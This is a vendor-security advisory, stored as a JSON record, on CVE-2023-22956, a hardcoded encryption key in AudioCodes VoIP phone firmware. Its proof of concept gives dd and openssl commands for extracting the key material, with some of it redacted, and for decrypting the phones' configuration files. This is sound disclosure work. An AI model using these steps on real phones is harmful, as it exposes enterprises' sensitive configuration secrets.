{
    "text": "vul_url : ， vul_name : AudioCodes VoIP Phones Hardcoded Key ， vul_date : 2023.08.16 ， vul_credit_name : Moritz Abrell ， vul_risk : High ， vul_local : No ， vul_remote : Yes ， vul_cve : CVE-2023-22956 ， vul_cwe : CWE-321 ， vul_poc : -BEGIN PGP SIGNED MESSAGE- ， Hash: SHA512 ， Advisory ID: SYSS-2022-054 ， Product: AudioCodes VoIP Phones ， Manufacturer: AudioCodes Ltd. ， Affected Version(s): Firmware Versions >= 3.4.8.M4 ， Tested Version(s): Firmware Version 3.4.4.1000 ， Vulnerability Type: Use of Hard-coded Cryptographic Key (CWE-321) ， Risk Level: Medium ， Solution Status: Open ， Manufacturer Notification: 2022-11-11 ， Solution Date: N.A. ， Public Disclosure: 2023-08-10 ， CVE ， Author of Advisory: Moritz Abrell, SySS GmbH ， Overview: ， AudioCodes VoIP phones are modern desk phones which are used for the ， operation in enterprise environments. ， The manufacturer describes the product as follows (see [1]): ， \"The AudioCodes 400HD series of IP phones is a range of easy-to-use, ， feature-rich desktop devices for the service provider hosted services, ， enterprise IP telephony and contact center markets. Based on the same ， advanced, field-proven underlying technology as our other VoIP products, ， AudioCodes high quality IP phones enable systems integrators and end ， customers to build end-to-end VoIP solutions.\" ， Vulnerability Details: ， The AudioCodes VoIP phones can be managed centrally, whereby configuration ， files are provided and requested by the phones at a central location. ， These configuration files can also be provided in encrypted form. ， This is intended to protect sensitive information within the configuration ， files from unauthorized access. ， Due to the use of a hardcoded cryptographic key, an attacker is able to ， decrypt encrypted configuration files and retrieve sensitive information. ， Proof of Concept (PoC): ， By analyzing the ELF executable \"decryption_tool\" of an AudioCodes IP phone ， firmware in a disassembler and decompiler, e.g. Ghidra, the encryption ， mechanism could be reversed and the hardcoded cryptographic key could be ， extracted. ， Used encryption algorithm: Triple DES in CBC mode ， Memory address of the 64-byte secret for OpenSSL key and IV derivation: 00001e8f ， Extracting the secret: ， #> offset=$(python3 -c 'print(int(\"00001e8f\", base=16)') ， #> dd skip=$offset count=64 if=decryption_tool of=secret.bin bs=1 ， Deriving the key and IV from the 64-byte secret: ， #> openssl enc -des-ede3-cbc -P -pass pass:h4dArat[.] -nosalt ， key = 40DA61FB4831FF53[.] ， iv = C614B77A[.] ， With the derived key and IV, it is possible to decrypt encrypted configuration ， files. ， As a proof of concept, the OpenSSL command-line tool can be used for ， decryption: ， #> openssl enc -d -des-ede3-cbc -pass pass:h4dArat[.] -nosalt \\ ， -in /tmp/encrypted_config.cfg -out /tmp/plain_config.cfg"
}